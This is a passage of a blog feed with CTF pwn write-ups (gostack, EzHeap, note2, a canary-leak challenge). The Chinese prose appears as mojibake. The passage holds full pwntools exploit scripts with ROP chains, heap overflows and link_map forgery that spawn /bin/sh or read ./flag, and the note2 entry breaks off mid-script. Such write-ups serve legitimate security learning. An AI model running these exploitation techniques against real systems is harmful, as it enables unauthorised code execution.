alt="image-20240918212931846"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc</title>
      <link href="/2024/09/13/glibc/"/>
      <url>/2024/09/13/glibc/</url>
      
        <content type="html"><![CDATA[<h3 id="æ‰‹åŠ¨ä¸‹è½½glibcç‰ˆæœ¬"><a href="#æ‰‹åŠ¨ä¸‹è½½glibcç‰ˆæœ¬" class="headerlink" title="æ‰‹åŠ¨ä¸‹è½½glibcç‰ˆæœ¬"></a>æ‰‹åŠ¨ä¸‹è½½glibcç‰ˆæœ¬</h3><p> æœ‰æ—¶å€™åšé¢˜ä¼šé‡åˆ°glibc-all-in-oneé‡Œæ²¡æœ‰çš„glibc,éœ€è¦è‡ªå·±ä¸‹</p><p>å¯ä»¥åˆ°ç½‘ç«™æ‰‹åŠ¨ä¸‹è½½å¯¹åº”çš„./debæ–‡ä»¶</p><pre><code class="lang-py">http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/</code></pre><p>åœ¨glibc-all-in-oneç›®å½•ä¸‹ï¼Œè‹¥glibcç‰ˆæœ¬åä¸ºx,ç”¨æŒ‡ä»¤è§£å‹</p><pre><code class="lang-py">./extract ./x.deb ./libs/x</code></pre><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913170944068.png" alt="image-20240913170944068"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gostack</title>
      <link href="/2024/09/12/gostack/"/>
      <url>/2024/09/12/gostack/</url>
      
        <content type="html"><![CDATA[<p>i ä¸€ä¸ªç”¨goè¯­è¨€å†™çš„ç¨‹åºã€‚</p><p> alt+f7ç”¨go_parserä¿®å¤ä¸€ä¸‹</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193439984.png" alt="image-20240912193439984"></p><p>ä¸»è¦çš„å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œå› ä¸ºæ˜¯goè¯­è¨€å†™çš„ï¼Œå…¶åæ±‡ç¼–ä¹Ÿæ˜¯å¾ˆéš¾çœ‹æ‡‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193707048.png" alt="image-20240912193707048"></p><p>ä¸»è¦çœ‹æ±‡ç¼–,å®ƒåé¢ä¼šå°†è¾“å…¥çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ ˆä¸Š</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194553878.png" alt="image-20240912194553878"></p><p>åœ¨scannerè¾“å…¥è¿™é‡Œä¼šæ£€æŸ¥è¿™ä¸ªä½ç½®çš„å€¼æ˜¯å¦ä¸º0</p><p>ä¸ºäº†æ–¹ä¾¿å…¨éƒ½ç”¨0å¡«å……</p><p>è„šæœ¬çš„å…·ä½“è°ƒè¯•æ˜¯æŠ¥é”™çš„ï¼Œçœ‹ä¸äº†ï¼Œä¹Ÿåªèƒ½åˆ†æä¸ªå¤§æ¦‚ã€‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195104594.png" alt="image-20240913195104594"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195003832.png" alt="image-20240913195003832"></p><p>ç›´æ¥gdb</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194856414.png" alt="image-20240912194856414"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194938053.png" alt="image-20240912194938053"></p><p>ç®—å‡ºè·ç¦»rbpæ˜¯0x1c8çš„è·ç¦»ã€‚</p><p>è¿™ç§é¢˜ä¸€èˆ¬æ˜¯ç”¨ret2syscallã€‚è€Œå¾€å¹´çš„å›½èµ›é¢˜ä¹Ÿæ˜¯ret2syscallå±…å¤šã€‚</p><p>æ‰¾åˆ°çš„gadget</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912195323699.png" alt="image-20240912195323699"></p><p>syscall;retæ˜¯å¾ˆéš¾æ‰¾åˆ°çš„ã€‚é€šè¿‡gadgetæ‰¾ä¸åˆ°ã€‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913194222552.png" alt="image-20240913194222552"></p><p>å…ˆsys_readåœ¨bssæ®µè¾“å…¥bin/sh,å†sys_execve.</p><pre><code class="lang-py">#bss readpayload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)</code></pre><pre><code class="lang-py">#execvepayload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)</code></pre><h5 id="åŒæ—¶ä¹Ÿé¡ºå¸¦å¤ä¹ ä¸€ä¸‹ï¼Œsys-readçš„å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œrax-0-rdi-0-rsi-bss-rdx-size"><a href="#åŒæ—¶ä¹Ÿé¡ºå¸¦å¤ä¹ ä¸€ä¸‹ï¼Œsys-readçš„å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œrax-0-rdi-0-rsi-bss-rdx-size" class="headerlink" title="åŒæ—¶ä¹Ÿé¡ºå¸¦å¤ä¹ ä¸€ä¸‹ï¼Œsys_readçš„å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œrax=0,rdi=0,rsi=bss,rdx=size."></a>åŒæ—¶ä¹Ÿé¡ºå¸¦å¤ä¹ ä¸€ä¸‹ï¼Œsys_readçš„å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œrax=0,rdi=0,rsi=bss,rdx=size.</h5><h5 id="sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0"><a href="#sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0" class="headerlink" title="sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0."></a>sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0.</h5><h5 id="å‰é¢æŒ‰ç…§è„šæœ¬ä¸€æ ·å†™ä¸€ç›´è·‘ä¸é€šï¼Œåé¢çªç„¶å°±è·‘é€šäº†ï¼Œä¹Ÿæ˜¯æœ‰ç‚¹ç¦»è°±ã€‚"><a href="#å‰é¢æŒ‰ç…§è„šæœ¬ä¸€æ ·å†™ä¸€ç›´è·‘ä¸é€šï¼Œåé¢çªç„¶å°±è·‘é€šäº†ï¼Œä¹Ÿæ˜¯æœ‰ç‚¹ç¦»è°±ã€‚" class="headerlink" title="å‰é¢æŒ‰ç…§è„šæœ¬ä¸€æ ·å†™ä¸€ç›´è·‘ä¸é€šï¼Œåé¢çªç„¶å°±è·‘é€šäº†ï¼Œä¹Ÿæ˜¯æœ‰ç‚¹ç¦»è°±ã€‚"></a>å‰é¢æŒ‰ç…§è„šæœ¬ä¸€æ ·å†™ä¸€ç›´è·‘ä¸é€šï¼Œåé¢çªç„¶å°±è·‘é€šäº†ï¼Œä¹Ÿæ˜¯æœ‰ç‚¹ç¦»è°±ã€‚</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;pwn.challenge.ctf.show&quot;,28159)#p=process(&quot;./gostack&quot;)context.log_level=&quot;debug&quot;context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)#payload=b&#39;a&#39;*0x1d0+p64(0x4A0af6)pop_rdi_r14=0x4a18a5pop_rax=0x40f984bss=0x5655C2pop_rsi=0x42138apop_rdx=0x4944ecsyscall_ret=0x4616C9#gdb.attach(p)#pause()#bss readpayload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)#excevepayload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)#p.recv()p.sendlineafter(&#39;magic message :&#39;,payload)p.sendline(b&#39;/bin/sh\x00&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pstack</title>
      <link href="/2024/09/08/pstack/"/>
      <url>/2024/09/08/pstack/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ­¦åŠŸè®ºå‰‘</title>
      <link href="/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/"/>
      <url>/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/</url>
      
        <content type="html"><![CDATA[<p>ä¸€é“å¾ˆç®€å•çš„apké¢˜ï¼Œåæ±‡ç¼–å‡ºæ¥ï¼Œå°†ä¸¤ä¸ªæ•°ç»„çš„å€¼ä¸€ä¸€å¼‚æˆ–å°±å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2024/07/27/dlFW9we6XxpRzNV.png" alt="image-20240727135021283"></p><p>è¿™é“ç®€å•çš„æ ˆæº¢å‡ºé¢˜ï¼Œå¼€äº†canaryä¿æŠ¤</p><p>è¿™é‡Œè¾“å…¥0x49ä¸ªå­—èŠ‚å¯ä»¥å°†canaryå’Œrbpæ‰“å°å‡ºæ¥</p><p><img src="https://s2.loli.net/2024/07/27/37YWbzvPcIiJ1H2.png" alt="image-20240727141257896"></p><p>ä¸»å‡½æ•°æœ‰ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œè¿™é‡Œret2libcæ³„éœ²putsçš„gotè¡¨åœ°å€ï¼Œå†è¿”å›é‡æ–°è¾“å…¥ä¸€æ¬¡</p><p><img src="https://s2.loli.net/2024/07/27/LGPVpf3ImUwqYdZ.png" alt="image-20240727141435162"></p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;59.62.61.30&quot;,46489)p=process(&quot;./pwn&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)pop_rdi=0x400853puts_got=0x601018call_puts=0x4007afpayload=b&#39;a&#39;*0x48+b&#39;b&#39;puts_plt=0x400580#pause()p.send(payload)p.recvuntil(&#39;b&#39;)canary=u64(p.recv(7).rjust(8,b&#39;\x00&#39;))rbp_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))print(hex(canary))print(&#39;rbp&#39;+hex(rbp_addr))payload=b&#39;b&#39;*0x48+p64(canary)+p64(rbp_addr-0x50)payload+=p64(pop_rdi)+p64(puts_got)+p64(call_puts)gdb.attach(p)sleep(1)pause()p.sendlineafter(&#39;overflow!&#39;,payload)p.recvline()puts=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))base=puts-libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+next(libc.search(b&#39;bin/sh&#39;))print(&#39;puts&#39;+hex(puts))one=[0x4f3d5,0x4f432,0x10a41c]one_gadget=base+one[0]#p.recvline()payload=b&#39;a&#39;*0x48+p64(canary)+b&#39;a&#39;*8+p64(one_gadget)#+p64(pop_rdi)+p64(binsh)+p64(system)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_pwn</title>
      <link href="/2024/05/19/ciscn-pwn/"/>
      <url>/2024/05/19/ciscn-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€å¤©-gostack"><a href="#ç¬¬ä¸€å¤©-gostack" class="headerlink" title="ç¬¬ä¸€å¤©_gostack"></a>ç¬¬ä¸€å¤©_gostack</h2><h5 id="64ä½çš„é™æ€ç¼–è¯‘é¢˜"><a href="#64ä½çš„é™æ€ç¼–è¯‘é¢˜" class="headerlink" title="64ä½çš„é™æ€ç¼–è¯‘é¢˜"></a>64ä½çš„é™æ€ç¼–è¯‘é¢˜</h5><p><img src="https://s2.loli.net/2024/05/19/xeACKin2JEw7B8X.png" alt="image-20240519162316093"></p><p><img src="https://s2.loli.net/2024/05/19/5HwmgvtCEARJojT.png" alt="image-20240519162532844"></p><h5 id="å¾ˆæ˜æ˜¾çš„syscallå’Œå¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„gadget"><a href="#å¾ˆæ˜æ˜¾çš„syscallå’Œå¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„gadget" class="headerlink" title="å¾ˆæ˜æ˜¾çš„syscallå’Œå¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„gadget"></a>å¾ˆæ˜æ˜¾çš„syscallå’Œå¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„gadget</h5><p><img src="https://s2.loli.net/2024/05/19/lAQMKgWLYoJOx2n.png" alt="image-20240519162808628"></p><p><img src="https://s2.loli.net/2024/05/19/WIfjVbrg7SMcAPh.png" alt="image-20240519162853532"></p><h5 id="åˆ©ç”¨syscallå‘bssæ®µå†™å…¥-bin-shï¼Œå†syscallæ‰§è¡Œexecve-â€˜bin-shâ€™-0-0-æ‹¿åˆ°flag"><a href="#åˆ©ç”¨syscallå‘bssæ®µå†™å…¥-bin-shï¼Œå†syscallæ‰§è¡Œexecve-â€˜bin-shâ€™-0-0-æ‹¿åˆ°flag" class="headerlink" title="åˆ©ç”¨syscallå‘bssæ®µå†™å…¥ bin/shï¼Œå†syscallæ‰§è¡Œexecve(â€˜bin/shâ€™,0,0),æ‹¿åˆ°flag"></a>åˆ©ç”¨syscallå‘bssæ®µå†™å…¥ bin/shï¼Œå†syscallæ‰§è¡Œexecve(â€˜bin/shâ€™,0,0),æ‹¿åˆ°flag</h5><p><img src="https://s2.loli.net/2024/05/19/PIrL94hM2jltmno.png" alt="image-20240519163321686"></p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;8.147.134.47&quot;,16589)#p=process(&quot;./gostack&quot;)elf=ELF(&#39;./gostack&#39;)context.log_level=&quot;debug&quot;# Gadgets and syscall addressessyscall_address = 0x404043rax_ret_address = 0x40f984rdi_6_ret_address = 0x4a18a5rsi_ret_address = 0x42138ardx_ret_address = 0x4944ec# Create the payloadpayload = b&#39;a&#39; * 0x100payload += p64(elf.bss()) + p64(0x10) + p64(0) * 0x18payload += p64(rdi_6_ret_address) + p64(0) * 6payload += p64(rsi_ret_address) + p64(elf.bss() + 0x200)payload += p64(rdx_ret_address) + p64(0x100)payload += p64(rax_ret_address) + p64(0)payload += p64(syscall_address)payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5payload += p64(rsi_ret_address) + p64(0)payload += p64(rdx_ret_address) + p64(0)payload += p64(rax_ret_address) + p64(0x3b)payload += p64(syscall_address)# Send the payloadp.sendlineafter(&#39;message :\n&#39;, payload)input()p.sendline(&#39;/bin/sh\x00&#39;)p.interactive()</code></pre><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p><img src="https://s2.loli.net/2024/05/19/tjciLKWbQEsTOF2.png" alt="image-20240519164039631"></p><h5 id="editå‡½æ•°å­˜åœ¨å †æº¢å‡º"><a href="#editå‡½æ•°å­˜åœ¨å †æº¢å‡º" class="headerlink" title="editå‡½æ•°å­˜åœ¨å †æº¢å‡º"></a>editå‡½æ•°å­˜åœ¨å †æº¢å‡º</h5><p><img src="https://s2.loli.net/2024/05/19/WyVCcLqEt6MK45J.png" alt="image-20240519164143452"></p><h5 id="å¼€å¯äº†æ²™ç®±ä¿æŠ¤-è¿™æ˜¯ä¸€é“å †çš„orwã€‚"><a href="#å¼€å¯äº†æ²™ç®±ä¿æŠ¤-è¿™æ˜¯ä¸€é“å †çš„orwã€‚" class="headerlink" title="å¼€å¯äº†æ²™ç®±ä¿æŠ¤,è¿™æ˜¯ä¸€é“å †çš„orwã€‚"></a>å¼€å¯äº†æ²™ç®±ä¿æŠ¤,è¿™æ˜¯ä¸€é“å †çš„orwã€‚</h5><p><img src="https://s2.loli.net/2024/05/19/EVw45MF9RsYUeTp.png" alt="image-20240519164437835"></p><h5 id="æ³„éœ²å‡ºå †çš„åŸºåœ°å€"><a href="#æ³„éœ²å‡ºå †çš„åŸºåœ°å€" class="headerlink" title="æ³„éœ²å‡ºå †çš„åŸºåœ°å€"></a>æ³„éœ²å‡ºå †çš„åŸºåœ°å€</h5><pre><code class="lang-py">add_chunk(0x28)add_chunk(0x28)# Edit and leak heap addressedit_chunk(0, 0x50, b&#39;a&#39; * 0x50)show_chunk(0)io.recvuntil(b&#39;a&#39; * 0x50)gdb.attach(io)pause()heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))heap_base = heap_leak &lt;&lt; 12</code></pre><p><img src="https://s2.loli.net/2024/05/19/eM7kiyhCDB5rKgT.png" alt="image-20240519165038422"></p><h5 id="å°†free-hookæ”¹æˆsetcontext-é€šè¿‡setcontextæ§åˆ¶rspè¿›è€Œorw-æ„é€ ropæœ€åè·å¾—flag"><a href="#å°†free-hookæ”¹æˆsetcontext-é€šè¿‡setcontextæ§åˆ¶rspè¿›è€Œorw-æ„é€ ropæœ€åè·å¾—flag" class="headerlink" title="å°†free_hookæ”¹æˆsetcontext,é€šè¿‡setcontextæ§åˆ¶rspè¿›è€Œorw,æ„é€ ropæœ€åè·å¾—flag"></a>å°†free_hookæ”¹æˆsetcontext,é€šè¿‡setcontextæ§åˆ¶rspè¿›è€Œorw,æ„é€ ropæœ€åè·å¾—flag</h5><pre><code class="lang-py">from pwn import *elf = ELF(&quot;./EzHeap&quot;)context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io=process(&#39;EzHeap&#39;)#io = remote(&#39;8.147.129.121&#39;, 26987)def add_chunk(size, content=b&#39;&#39;):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;1&#39;)    io.sendlineafter(&quot;size:&quot;, str(int(size)))    io.sendafter(&quot;content:&quot;, content)def delete_chunk(index):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;2&#39;)    io.sendlineafter(&quot;idx:&quot;, str(index))def edit_chunk(index, size, content):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;3&#39;)    io.sendlineafter(&quot;idx:&quot;, str(index))    io.sendlineafter(&quot;size:&quot;, str(size))    io.sendafter(&quot;content:&quot;, content)def show_chunk(index):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;4&#39;)    io.sendlineafter(&quot;idx:&quot;, str(index))def exit_program():    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;5&#39;)# Add initial chunksadd_chunk(0x28)add_chunk(0x28)# Edit and leak heap addressedit_chunk(0, 0x50, b&#39;a&#39; * 0x50)show_chunk(0)io.recvuntil(b&#39;a&#39; * 0x50)gdb.attach(io)pause()heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))heap_base = heap_leak &lt;&lt; 12# Edit chunk to set up fake chunkedit_chunk(0, 0x50, b&#39;\x00&#39; * 0x28 + p64(0x21) + b&#39;\x00&#39; * 0x18 + p64(0xd1))# Leak libc addressedit_chunk(1, 0x30, b&#39;a&#39; * 0x30)show_chunk(1)io.recvuntil(b&#39;a&#39; * 0x30)libc_leak = u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))libc_base = libc_leak - 0x21ace0# Edit chunk to consolidate chunksedit_chunk(1, 0x30, b&#39;\x00&#39; * 0x28 + p64(0xf1))# Set up libc addressessetcontext_address = libc_base + 0x539e0 + 61read_address = libc_base + 0x1147d0write_address = libc_base + 0x114870rtld_global_address = libc_base + 0x285040rtld_3_address = libc_base + 0x2865a0pop_rdi = libc_base + 0x2a3e5pop_rsi = libc_base + 0xe7d0dpop_rdx = libc_base + 0x11f2e7  # r12ret = libc_base + 0x1193c1pop_rax = libc_base + 0x45eb0syscall = libc_base + 0x91316target_address = ((heap_base + 0x1e30) &gt;&gt; 12) ^ rtld_global_address# Add chunks to manipulate heapadd_chunk(0x78)  # Chunk 2add_chunk(0x78)  # Chunk 3add_chunk(0x78)  # Chunk 4add_chunk(0x78)  # Chunk 5edit_chunk(5, 0x100, b&#39;a&#39; * 0x78 + p64(0x21) + p64(target_address))add_chunk(0x18)  # Chunk 6add_chunk(0x18)  # Chunk 7add_chunk(0x18)  # Chunk 8add_chunk(0x18)  # Chunk 9add_chunk(0x18, p64(heap_base + 0x300) + p64(5) + p64(rtld_3_address))heap_leak_adjusted = heap_base - 0x650l_next_address = libc_base + 0x286890# Create link maplink_map = p64(0)link_map += p64(l_next_address)link_map += p64(0)link_map += p64(heap_leak_adjusted + 0x940)link_map += p64(0) * 28link_map += p64(heap_leak_adjusted + 0xa50)link_map += p64(heap_leak_adjusted + 0xa70)link_map += p64(heap_leak_adjusted + 0xa60)link_map += p64(0x10)link_map += p64(setcontext_address)link_map += p64(ret)link_map += p64(0) * 13link_map += p64(heap_leak_adjusted + 0x200)link_map += b&#39;./flag&#39;.ljust(8, b&#39;\x00&#39;)link_map += p64(0)link_map += p64(0x100)link_map += p64(0) * 2link_map += p64(heap_leak_adjusted + 0xc60)link_map += p64(ret)link_map += p64(0) * 38link_map += p64(0x800000000)# Create ROP chainrop_chain = p64(ret) * 0x1rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + 0xaf0)rop_chain += p64(pop_rax) + p64(2)rop_chain += p64(pop_rsi) + p64(0)rop_chain += p64(syscall)rop_chain += p64(pop_rdi) + p64(3)rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)rop_chain += p64(read_address)rop_chain += p64(pop_rdi) + p64(1)rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)rop_chain += p64(write_address)# Edit chunk with link map and ROP chainedit_chunk(0, 0x400, link_map + rop_chain)# Exit and trigger the payloadexit_program()io.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easyshell</title>
      <link href="/2024/05/02/easyshell/"/>
      <url>/2024/05/02/easyshell/</url>
      
        <content type="html"><![CDATA[<pre><code>from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./babyheap&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;libc.so&#39;)elf=ELF(&#39;babyheap&#39;)p.recvuntil(&#39;captcha is: &#39;)cap=p.recv(8)p.sendlineafter(&#39;the captcha: &#39;,cap)#p.sendlineafter(#p.sendlineafter(&#39;Please Select: &#39;,)def add(index,size):    p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))    p.sendlineafter(&#39;Size: &#39;,str(size))def fill(size,content):    p.sendlineafter(&#39;Please Select: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))    p.sendlineafter(&#39;Content: &#39;,content)gdb.attach(p)sleep(1)add(20,0x60)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heap</title>
      <link href="/2024/04/27/heap/"/>
      <url>/2024/04/27/heap/</url>
      
        <content type="html"><![CDATA[<p>chunkå°±æ˜¯ä¸€æ•´ä¸ª</p><p><img src="https://s2.loli.net/2024/05/14/f3vUmEAbwlS7J6j.png" alt="image-20240514230404731"></p><p> mallocè¿”å›çš„æŒ‡é’ˆæŒ‡å‘chunkçš„æ•°æ®åŒºåŸŸ</p><p>freeè¿”å›çš„æŒ‡é’ˆæŒ‡å‘chunkçš„header</p><p>pre_sizeåªæœ‰åœ¨ä¸Šä¸€ä¸ªchunkï¼ˆç‰©ç†ç›¸é‚»ï¼‰æ˜¯é‡Šæ”¾æ—¶æ‰å±äºä¸‹ä¸€ä¸ªchunkçš„åŒºåŸŸï¼Œå¦åˆ™å±äºä¸Šä¸€ä¸ªchunkçš„</p><p>free_chunkçš„å¤§å° 0x20~0x0x80,malloc(8)å¾—åˆ°çš„æ˜¯0x20çš„chunk</p><p><img src="https://s2.loli.net/2024/05/14/Y7PbWRAnHrodXKG.png" alt="image-20240514230437610"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>note2</title>
      <link href="/2024/04/26/note2/"/>
      <url>/2024/04/26/note2/</url>
      
        <content type="html"><![CDATA[<p> æ²¡å¼€åç§»çš„ä¿æŠ¤</p><p>sizeæ˜¯æ— ç¬¦å·æ•°</p><p><img src="https://s2.loli.net/2024/04/28/tRUaW5Y9BfsNqeI.png" alt="image-20240426213934832"></p><p>è¿›å‡½æ•°åå˜æœ‰ç¬¦å·æ•°ï¼Œä¼šæœ‰æº¢å‡º</p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426214016393.png" alt="image-20240426214016393"></p><p><img src="https://s2.loli.net/2024/04/28/Cj3ytfD9z2euRWx.png" alt="image-20240426190337391"></p><p><img src="https://s2.loli.net/2024/04/28/2mSIchNlVYxzaHZ.png" alt="image-20240426190621665"></p><p><img src="https://s2.loli.net/2024/04/28/qxcdEysoNJZnevh.png" alt="image-20240426190918191"></p><h5 id="è¿™é‡Œåªèƒ½ç”¨å­—èŠ‚æ¥å¡«å……ï¼Œbâ€™-x00â€™éƒ½ä¸è¡Œ"><a href="#è¿™é‡Œåªèƒ½ç”¨å­—èŠ‚æ¥å¡«å……ï¼Œbâ€™-x00â€™éƒ½ä¸è¡Œ" class="headerlink" title="è¿™é‡Œåªèƒ½ç”¨å­—èŠ‚æ¥å¡«å……ï¼Œbâ€™\x00â€™éƒ½ä¸è¡Œ"></a>è¿™é‡Œåªèƒ½ç”¨å­—èŠ‚æ¥å¡«å……ï¼Œbâ€™\x00â€™éƒ½ä¸è¡Œ</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426211910916.png" alt="image-20240426211910916"></p><h5 id="æ”¹äº†free-gotæ‰freeçš„ï¼Œä¼šæ‰§è¡Œone-gadget"><a href="#æ”¹äº†free-gotæ‰freeçš„ï¼Œä¼šæ‰§è¡Œone-gadget" class="headerlink" title="æ”¹äº†free_gotæ‰freeçš„ï¼Œä¼šæ‰§è¡Œone_gadget"></a>æ”¹äº†free_gotæ‰freeçš„ï¼Œä¼šæ‰§è¡Œone_gadget</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426213312570.png" alt="image-20240426213312570"></p><h5 id="ç”¨systemæ‰“ä¼šæŠ¥é”™ï¼Œä¸è¡Œ"><a href="#ç”¨systemæ‰“ä¼šæŠ¥é”™ï¼Œä¸è¡Œ" class="headerlink" title="ç”¨systemæ‰“ä¼šæŠ¥é”™ï¼Œä¸è¡Œ"></a>ç”¨systemæ‰“ä¼šæŠ¥é”™ï¼Œä¸è¡Œ</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426215822432.png" alt="image-20240426215822432"></p><h5 id="å› ä¸ºè¿™é‡Œæœ‰ä¸ªstrncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-å‡½æ•°ï¼Œé‡åˆ°â€˜-0â€™æˆ–ç©ºå­—ç¬¦æˆªåœ"><a href="#å› ä¸ºè¿™é‡Œæœ‰ä¸ªstrncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-å‡½æ•°ï¼Œé‡åˆ°â€˜-0â€™æˆ–ç©ºå­—ç¬¦æˆªåœ" class="headerlink" title="å› ä¸ºè¿™é‡Œæœ‰ä¸ªstrncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);å‡½æ•°ï¼Œé‡åˆ°â€˜\0â€™æˆ–ç©ºå­—ç¬¦æˆªåœ"></a>å› ä¸ºè¿™é‡Œæœ‰ä¸ªstrncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);å‡½æ•°ï¼Œé‡åˆ°â€˜\0â€™æˆ–ç©ºå­—ç¬¦æˆªåœ</h5><p><img src="https://s2.loli.net/2024/04/28/c2k16O4aoGXNPDB.png" alt="image-20240426213647135"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,27431)p=process(&quot;./note2&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)elf=ELF(&#39;./note2&#39;)p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;)p.sendlineafter(&#39;address:&#39;,&#39;asdf&#39;)def add(size,content):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    p.sendlineafter(&#39;(less than 128)&#39;,str(size))    p.sendlineafter(&#39; content:&#39;,content)def show(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;2&quot;)    p.recvuntil(&quot;:&quot;)    p.sendline(str(index))def edit(index, choice, content):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;3&quot;)    p.recvuntil(&quot;:&quot;)    p.sendline(str(index))    p.recvuntil(&quot;]&quot;)    p.sendline(str(choice))    p.recvuntil(&quot;:&quot;)    p.sendline(content)def free(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;4&quot;)    p.recvuntil(&quot;:&quot;)    p.sendline(str(index))&#39;&#39;&#39;io.recvuntil(&quot;:&quot;)io.sendline(&quot;/bin/sh&quot;) 